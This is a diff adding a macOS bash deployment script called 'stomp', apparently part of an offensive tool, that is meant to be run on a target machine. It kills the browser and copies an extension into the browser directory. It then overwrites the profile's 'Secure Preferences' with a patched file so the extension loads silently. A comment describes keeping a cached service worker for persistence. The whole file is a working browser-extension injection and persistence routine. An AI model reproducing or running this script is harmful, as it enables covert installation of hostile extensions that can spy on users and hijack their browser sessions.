@@ -1,0 +1,57 @@
+#!/bin/bash
+# stomp — macOS deployment script (mirror of inject.bat).
+# Run on the target from the extracted _deploy.zip:  bash inject.sh
+set -u
+
+DEPLOY_DIR="$(cd "$(dirname "$0")" && pwd)"
+PROFILE_PATH="$HOME/Library/Application Support/{{BROWSER_PROFILE_PATH}}"
+PROC_NAME="{{BROWSER_PROC_NAME}}"
+BROWSER_TARGET_DIR="{{BROWSER_TARGET_DIR}}"
+
+CLEAN_PREFS="$DEPLOY_DIR/SecurePreferencesClean"
+NEW_PREFS="$DEPLOY_DIR/Secure Preferences"
+
+# Sanity checks
+[ -f "$CLEAN_PREFS" ]          || { echo "[!] SecurePreferencesClean not found"; exit 1; }
+[ -f "$NEW_PREFS" ]            || { echo "[!] Secure Preferences not found"; exit 1; }
+[ -d "$DEPLOY_DIR/extension" ] || { echo "[!] extension/ folder not found"; exit 1; }
+[ -d "$PROFILE_PATH" ]         || { echo "[!] Browser profile not found: $PROFILE_PATH"; exit 1; }
+
+# Kill browser
+echo "[*] Killing $PROC_NAME ..."
+pkill -f "$PROC_NAME" 2>/dev/null || true
+sleep 2
+
+# Restore clean Secure Preferences to avoid collision
+echo "[*] Restoring clean Secure Preferences..."
+cp -f "$CLEAN_PREFS" "$PROFILE_PATH/Secure Preferences" || { echo "[!] Failed to restore clean Secure Preferences"; exit 1; }
+
+# Remove service worker base
+# Uncomment to wipe the Service Worker cache on each injection.
+# Keep it COMMENTED to leave the cached worker in place (GAP persistence).
+# rm -rf "$PROFILE_PATH/Service Worker/Database"     2>/dev/null || true
+# rm -rf "$PROFILE_PATH/Service Worker/ScriptCache"  2>/dev/null || true
+# rm -rf "$PROFILE_PATH/Service Worker/CacheStorage" 2>/dev/null || true
+
+# Open then close browser to reset internal state
+echo "[*] Opening {{BROWSER_NAME}} to reset state..."
+open -a "$PROC_NAME" 2>/dev/null || true
+sleep 3
+pkill -f "$PROC_NAME" 2>/dev/null || true
+sleep 1
+
+# Copy extension folder(s) to the browser target dir
+echo "[*] Copying extension to $BROWSER_TARGET_DIR..."
+mkdir -p "$BROWSER_TARGET_DIR"
+for d in "$DEPLOY_DIR/extension"/*/; do
+    [ -d "$d" ] || continue
+    name="$(basename "$d")"
+    rm -rf "$BROWSER_TARGET_DIR/$name"
+    cp -R "${d%/}" "$BROWSER_TARGET_DIR/" || { echo "[!] Failed to copy $name"; exit 1; }
+done
+
+# Drop the patched Secure Preferences
+echo "[*] Overwriting Secure Preferences..."
+cp -f "$NEW_PREFS" "$PROFILE_PATH/Secure Preferences" || { echo "[!] Failed to overwrite Secure Preferences"; exit 1; }
+
+echo "[+] Done. Launch {{BROWSER_NAME}} to load the extension."
